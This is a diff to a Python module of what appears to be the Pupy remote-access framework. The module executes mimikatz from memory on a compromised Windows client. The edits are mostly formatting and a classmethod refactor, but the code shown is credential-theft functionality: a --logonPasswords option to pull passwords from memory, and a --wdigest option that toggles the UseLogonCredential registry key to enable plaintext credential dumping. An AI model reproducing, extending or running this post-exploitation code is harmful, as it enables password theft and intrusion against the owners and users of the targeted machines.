@@ -20,18 +20,25 @@ class Mimikatz(MemoryExec):
         execute mimikatz from memory
     """
 
-    dependencies = [ 
-        'pupymemexec', 
-        'pupwinutils.memexec', 
-        'pupwinutils.wdigest' 
+    dependencies = [
+        'pupymemexec',
+        'pupwinutils.memexec',
+        'pupwinutils.wdigest'
     ]
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="mimikatz", description=self.__doc__)
-        self.arg_parser.add_argument('args', nargs='*', help='run mimikatz commands from argv (let empty to open mimikatz interactively)')
-        self.arg_parser.add_argument("--wdigest", choices={'check', 'enable', 'disable'}, default='', help="Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1")
-        self.arg_parser.add_argument('--logonPasswords', action='store_true', default=False, help='retrieve passwords from memory')
-        
+    io = REQUIRE_TERMINAL
+
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog="mimikatz", description=cls.__doc__)
+        cls.arg_parser.add_argument(
+            'args', nargs='*', help='run mimikatz commands from argv (let empty to open mimikatz interactively)')
+        cls.arg_parser.add_argument(
+            "--wdigest", choices={'check', 'enable', 'disable'},
+            default='', help="Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1")
+        cls.arg_parser.add_argument(
+            '--logonPasswords', action='store_true', default=False, help='retrieve passwords from memory')
+
     def run(self, args):
 
         # for windows 10, if the UseLogonCredential registry is not present or disable (equal to 0), not plaintext password can be retrieved using mimikatz.
@@ -46,12 +53,12 @@ class Mimikatz(MemoryExec):
         proc_arch       = self.client.desc["proc_arch"]
         mimikatz_path   = None
         output          = ''
-        
+
         if "64" in proc_arch:
             mimikatz_path = self.client.pupsrv.config.get("mimikatz","exe_x64")
         else:
             mimikatz_path = self.client.pupsrv.config.get("mimikatz","exe_Win32")
-        
+
         if not os.path.isfile(mimikatz_path):
             self.error("Mimikatz exe %s not found ! please edit Mimikatz section in pupy.conf"%mimikatz_path)
         else:
